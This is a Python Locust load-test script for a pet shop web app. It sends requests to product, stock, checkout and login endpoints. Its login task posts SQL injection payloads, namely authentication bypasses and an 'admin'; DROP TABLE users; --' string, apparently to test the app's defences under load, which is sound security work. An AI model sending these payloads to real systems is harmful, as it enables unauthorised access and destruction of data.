from locust import HttpUser, TaskSet, task, between
import random

class UserBehavior(TaskSet):

    @task(1)
    def get_root(self):
        self.client.get("/")

    @task(3)
    def checkout(self):
        self.client.get("/pets/checkout")

    @task(4)
    def get_pet_product(self):
        id_value = 10101 if random.randint(1, 10) <= 2 else random.randint(1, 10000)
        self.client.get(f"/pets/products/{id_value}")

    @task(5)
    def check_stock(self):
        product_id = random.randint(1, 10000)
        self.client.get(f"/pets/check_stock/{product_id}")

    @task(6)
    def login(self):
        # Payloads para injeção SQL
        payloads = [
            {"login": "admin' --", "password": "anything"},
            {"login": "admin' OR 1=1 --", "password": "anything"},
            {"login": "admin'; DROP TABLE users; --", "password": "anything"},
            # Adicione mais payloads conforme necessário
        ]

        for payload in payloads:
            self.client.post("/login", json=payload)

class WebsiteUser(HttpUser):
    tasks = [UserBehavior]
    wait_time = between(1, 5)
